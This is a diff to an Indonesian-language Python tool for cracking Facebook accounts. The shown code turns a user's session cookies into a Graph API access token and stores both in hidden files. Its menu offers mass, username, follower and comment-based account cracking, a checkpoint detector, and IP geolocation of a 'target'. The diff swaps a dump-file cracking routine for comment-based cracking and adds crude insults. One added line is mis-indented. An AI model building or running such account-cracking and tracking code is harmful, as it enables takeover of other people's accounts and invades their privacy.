@@ -326,7 +326,7 @@ def login_lagi334():
 		banner()
 		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=47,style=f"bold cyan"))
 		asu = random.choice([m,k,h,b,u])
-		your_cookies=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
+		your_cookies=input(f'  [{h}•{x}][bold white] Masukkan Cookies :{asu} ')
 		with requests.Session() as r:
 			try:
 				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
@@ -370,10 +370,11 @@ def login_lagi334():
 							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
 							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
 							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
-							print(f"\n ╰─  Token : {access_token}")
+							print(f"\n ╰─  [bold white]Token : {asu}{access_token}")
 							tokenew = open(".token.txt","w").write(access_token)
 							cook= open(".cok.txt","w").write(your_cookies)
-							print("\n ╰─  Login Berhasil | python memek.py");exit()
+							print("\n ╰─  [bold white]Login Berhasil | Ketik Perintah Di Bawah Ini")
+							print(" ╰─ [bold white]python run.py");exit()
 			except Exception as e:
 				print(" ╰─  Cookies Mokad Kontol")
 				os.system('rm -rf .token.txt && rm -rf .cok.txt')
@@ -392,12 +393,11 @@ def menu(my_name,my_id):
 		time.sleep(5)
 		login()
 	os.system('clear')
-	os.system('xdg-open https://chat.whatsapp.com/KJH36H03zT38wtTOMfibac')
 	banner()
 	ip = requests.get("https://api.ipify.org").text
-	cetak(panel(f'[bold white]Minimal Follow IG Gw tod',width=32,style=f"bold cyan"))
-	cetak(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/]',width=42,style=f"bold cyan"))
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack File [[bold green] ON [bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Chek Hasil Crack [[bold green] ON [bold white]][/]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Crack Chekpoint Detector [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Lacak IP Target [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [[bold green] ON [bold white]][/]',width=47,title=f"[bold green]List Menu",style=f"bold cyan"))
+	cetak(panel(f'[bold white]Minimal Follow Facebook Gua Dulu Tod',width=32,style=f"bold cyan"))
+	cetak(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][+[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[\]\n[bold white][+[/][bold white]][/] [bold white]Status    : [bold green]Private[/][/]',width=42,style=f"bold cyan"))
+	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [[bold green] ON [bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [[bold green] ON [bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Username [[bold green] ON [bold white]][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Crack Followers [[bold green] ON [bold white]][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Crack Komen [[bold green] ON [bold white]][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Chek Hasil Crack [[bold green] ON [bold white]][/]\n[bold white][[bold green]07[/][bold white]][/] [bold white]Chekpoint Detector [[bold green] ON [bold white]][/]\n[bold white][[bold green]08[/][bold white]][/] [bold white]Lacak IP Target [[bold green] ON [bold white]][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [[bold green] ON [bold white]][/]',width=47,title=f"[bold green]List Menu",style=f"bold cyan"))
 	_____xyzon___xd____ = input(f' ╰─  Pilih Menu Crack : ')
 	if _____xyzon___xd____ in ['1','01']:
 		brayen_dump()
@@ -408,7 +408,7 @@ def menu(my_name,my_id):
 	elif _____xyzon___xd____ in ['4','04']:
 		pengikut()
 	elif _____xyzon___xd____ in ['5','05']:
-		crack_file()
+		komen()
 	elif _____xyzon___xd____ in ['6','06']:
 		result()
 	elif _____xyzon___xd____ in ['7','07']:
@@ -429,7 +429,7 @@ def error():
 	back() 
 #-----------------[ TRACK IP ]-----------------# 
 def lacakip():
-	link = input(f' [+]╰─ Masukan Ip : ')
+	link = input(f' [+] Masukan IP : ')
 	url = 'http://ip-api.com/json/' + link
 	r = requests.get(url)
 	data = json.loads(r.text)
@@ -440,20 +440,23 @@ def lacakip():
 		request = requests.get(url)
 		response = request.json()
 	except (requests.ConnectionError):
-		print(" [+]╰─ Koneksi Error")
+		print(" [+] Koneksi Error")
 		exit()
 	if response['status'] == 'success':
 		print('')
-		print(" [+]╰─ Alamat IP : " + response['query'])
-		print(" [+]╰─ Kota : " + response['city'])
-		print(" [+]╰─ Negara : " + response['country'])
-		print(" [+]╰─ Kode Negara : " + response['countryCode'])
-		print(" [+]╰─ Latitude : " + str(response['lat']))
-		print(" [+]╰─ Longitude : " + str(response['lon']))
-		print(" [+]╰─ ISP : " + response['isp'])
-		print(" [+]╰─ Link Google Maps :", google_maps_url)
+		print(" [+] Login : Success")
+		print(" [+] Alamat IP : " + response['query'])
+		print(" [+] Kota : " + response['city'])
+		print(" [+] Negara : " + response['country'])
+		print(" [+] Kode Negara : " + response['countryCode'])
+		print(" [+] Latitude : " + str(response['lat']))
+		print(" [+] Longitude : " + str(response['lon']))
+		print(" [+] ISP : " + response['isp'])
+		print(" [+] Link Google Maps :", google_maps_url)
+		sayangku = input(p+""+P+" ["+P+" Tekan Enter "+P+"] ")
+        back()
 	else:
-		print(" [+]╰─ Alamat IP Yang Dimasukkan Salah")
+		print(" [+] Alamat IP Yang Dimasukkan Salah")
 ###----------[ CRACK DARI KOMEN ]---------- ###
 def komen():
 	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
@@ -548,48 +551,6 @@ def cari_nama(link):
 	else:
 	     print("\r")
 	
-#-----------------[ CRACK FILE ]-----------------#
-def crack_file():
-	try:vin = os.listdir('DUMP')
-	except FileNotFoundError:
-		print(' ╰─  File Tidak Ditemukan ')
-		time.sleep(2)
-		back()
-	if len(vin)==0:
-		print(' ╰─  Kamu Tidak Memiliki File Dump ')
-		time.sleep(2)
-		back()
-	else:
-		cih = 0
-		lol = {}
-		for isi in vin:
-			try:hem = open('DUMP/'+isi,'r').readlines()
-			except:continue
-			cih+=1
-			if cih<100:
-				nom = ''+str(cih)
-				lol.update({str(cih):str(isi)})
-				lol.update({nom:str(isi)})
-				print(f' %s. %s ({h} %s{x} idz )'%(nom,isi,len(hem)))
-			else:
-				lol.update({str(cih):str(isi)})
-				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
-				print(' ╰─  %s. %s ({h} %s {x}idz) '%(cih,isi,len(hem)))
-		geeh = input('\n ╰─  Chouse : ')
-		print('')
-		try:geh = lol[geeh]
-		except KeyError:
-			print(f' ╰─{k}  Pilih Yang Bener Kontol {x}')
-			time.sleep(3)
-			back()
-		try:lin = open('DUMP/'+geh,'r').read().splitlines()
-		except:
-			print(' ╰─  File Tidak Ditemukan, Coba Lagi Nanti ')
-			time.sleep(2)
-			back()
-		for xid in lin:
-			id.append(xid)
-		setting()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
 	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold red"))
